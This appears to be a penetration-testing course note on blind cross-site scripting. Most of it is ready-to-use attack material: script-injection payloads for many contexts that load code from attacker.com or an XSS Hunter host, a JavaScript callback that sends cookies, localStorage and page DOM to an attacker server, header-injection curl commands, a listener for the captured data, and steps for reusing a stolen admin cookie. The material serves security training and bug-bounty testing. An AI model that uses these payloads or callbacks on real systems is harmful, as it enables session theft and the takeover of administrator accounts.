---
tags: [vapt, xss, intermediate]
difficulty: intermediate
module: "07 - XSS"
topic: "07.05 Blind XSS"
---

# 07.05 — Blind XSS

## What is Blind XSS?

Blind XSS is stored XSS where the payload executes in a context the attacker cannot directly observe — typically an admin panel, internal tool, or backend system that processes user-submitted data. You submit the payload and wait for an out-of-band callback confirming execution.

```
FLOW:
  1. Attacker submits XSS payload in a form field:
     Username: <script src="https://attacker.com/xss.js"></script>
     
  2. Payload is stored in the database
  
  3. Admin/staff reviews submissions in their internal panel
  
  4. Admin's browser loads: <td>[USERNAME]</td>
     = <td><script src="https://attacker.com/xss.js"></script></td>
  
  5. Admin's browser requests "https://attacker.com/xss.js"
     → Attacker SEES the request! XSS confirmed!
  
  6. xss.js executes in admin's browser context:
     → Captures admin cookies, screenshots, DOM content
     → Sends everything to attacker's server!
```

---

## XSS Hunter (Primary Tool)

[XSS Hunter](https://xsshunter.trufflesecurity.com) provides a specialized platform for capturing blind XSS executions.

```bash
# SETUP:
# 1. Register at https://xsshunter.trufflesecurity.com
# 2. Get your payload URL: https://YOURNAME.xss.ht

# YOUR PAYLOAD:
<script src=https://YOURNAME.xss.ht></script>

# WHAT XSS HUNTER CAPTURES:
# - DOM screenshot (full page screenshot!)
# - URL where XSS fired
# - Cookies (non-HttpOnly)
# - localStorage, sessionStorage
# - Full page source (innerHTML)
# - IP address
# - User agent (browser/OS info)
# - All HTTP requests made by the browser

# ALTERNATIVE PAYLOADS:
"><script src=https://YOURNAME.xss.ht></script>
'><script src=https://YOURNAME.xss.ht></script>
</script><script src=https://YOURNAME.xss.ht></script>
<img src=x onerror=document.write("<script src=https://YOURNAME.xss.ht></script>")>
```

---

## Manual Blind XSS Callback Payload

```javascript
// CUSTOM CALLBACK SCRIPT (host at https://attacker.com/xss.js):
(function(){
  var d = {
    url: window.location.href,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    dom: document.documentElement.innerHTML.substring(0,5000),
    title: document.title,
    ua: navigator.userAgent
  };
  
  // Send data to attacker server:
  new Image().src = 'https://attacker.com/blind?' + 
    btoa(JSON.stringify(d));
})();

// SHORTER VERSION (quick test):
new Image().src='https://attacker.com/blind?c='+document.cookie+'&u='+encodeURIComponent(location.href)
```

---

## Where to Inject Blind XSS

```
HIGH-VALUE BLIND XSS INJECTION POINTS:

ADMIN PANEL VIEWERS (most valuable):
  ✓ Support ticket system      → support staff reads tickets
  ✓ Contact form               → staff reads messages
  ✓ Bug report form            → security team reads reports!
  ✓ User feedback form         → staff reviews feedback
  ✓ "Report this content" form → moderators review reports
  ✓ Job application forms      → HR reads CVs (rich text!)
  
USER DATA IN ADMIN DASHBOARDS:
  ✓ Username, display name, bio
  ✓ Profile description
  ✓ User-submitted content visible to admins
  ✓ Log viewer (User-Agent, referrer, IP shown in logs)
  
AUTOMATED SYSTEMS:
  ✓ Email templates (HTML email renders XSS)
  ✓ PDF generation (some PDF renderers execute JS!)
  ✓ Headless browser-based screenshots
  ✓ CSV/Excel imports that evaluate formulas (CSV injection)
```

---

## Testing Fields with Multiple Payloads

```html
<!-- TEST ALL COMMON CONTEXTS — submit these across different fields: -->

<!-- 1. HTML context: -->
<script src=https://YOURNAME.xss.ht></script>

<!-- 2. HTML attribute context: -->
"><script src=https://YOURNAME.xss.ht></script>

<!-- 3. Single-quoted attribute: -->
'><script src=https://YOURNAME.xss.ht></script>

<!-- 4. No quotes in attribute: -->
></p><script src=https://YOURNAME.xss.ht></script>

<!-- 5. Closes existing script: -->
</script><script src=https://YOURNAME.xss.ht></script>

<!-- 6. No angle brackets filtered: -->
<img src=x onerror=import('https://YOURNAME.xss.ht')>

<!-- 7. JavaScript string context: -->
';import('https://YOURNAME.xss.ht')//

<!-- 8. Angular/Vue template injection: -->
{{constructor.constructor('import("https://YOURNAME.xss.ht")')()}}

<!-- SUBMIT SAME PAYLOAD ACROSS:
  - All form fields (first name, last name, company, subject, message)
  - HTTP headers (User-Agent, Referer, X-Forwarded-For)
  - URL parameters
  The one that fires tells you which field/header is displayed in the admin panel!
-->
```

---

## Setting Up Your Own Blind XSS Server

```bash
# SIMPLE PYTHON HTTP SERVER + LOGGING:
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
import base64, json, urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'\n[{datetime.now()}] BLIND XSS CALLBACK!')
        print(f'Path: {self.path}')
        print(f'UA: {self.headers.get(\"User-Agent\")}')
        
        # Parse data from URL:
        if '?' in self.path:
            params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            if 'c' in params:
                print(f'Cookies: {urllib.parse.unquote(params[\"c\"][0])}')
            if 'u' in params:
                print(f'URL: {urllib.parse.unquote(params[\"u\"][0])}')
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    
    def log_message(self, format, *args):
        pass  # suppress default logging

HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
" &

# TEST PAYLOAD:
curl 'http://localhost/blind?c=session%3DABC123&u=https%3A%2F%2Ftarget.com%2Fadmin'
```

---

## Blind XSS via HTTP Headers

```bash
# INJECT IN USER-AGENT (if admin panel shows logs):
curl -H "User-Agent: <script src=https://YOURNAME.xss.ht></script>" https://target.com/

# INJECT IN REFERER:
curl -H "Referer: <script src=https://YOURNAME.xss.ht></script>" https://target.com/

# INJECT IN X-FORWARDED-FOR:
curl -H "X-Forwarded-For: <script src=https://YOURNAME.xss.ht></script>" https://target.com/

# THESE ARE STORED IN LOGS AND SHOWN IN:
# → Apache/Nginx log viewer
# → Application admin access logs
# → Analytics dashboards
# → Security monitoring tools (SIEM!)
```

---

## When Blind XSS Fires — What to Do

```
ONCE YOU GET A CALLBACK:

1. CHECK XSS HUNTER DASHBOARD:
   → URL of admin panel
   → Page screenshot (you see the admin UI!)
   → Admin's cookies (if not HttpOnly)
   → Full DOM source

2. USE THE ADMIN'S COOKIES:
   → Copy Cookie header from XSS Hunter
   → Use in curl or browser devtools to access admin panel!
   curl -H "Cookie: admin_session=CAPTURED_VALUE" https://target.com/admin

3. ESCALATE:
   → What's in the admin panel? (from screenshot + DOM)
   → Look for: user management, config, API keys, audit logs
   → Use XSS to make API calls as admin

4. REPORT:
   → Show the screenshot of admin panel in bug report!
   → Very compelling evidence of impact
   → Include: how you submitted the payload, where it fired
```

---

## Related Notes
- [[03 - Stored XSS]] — stored XSS (blind is a specific case)
- [[16 - XSS to Session Hijacking]] — using captured cookies
- [[17 - XSS to Account Takeover]] — admin panel takeover
- [[21 - XSS Payloads Comprehensive List]] — comprehensive payloads
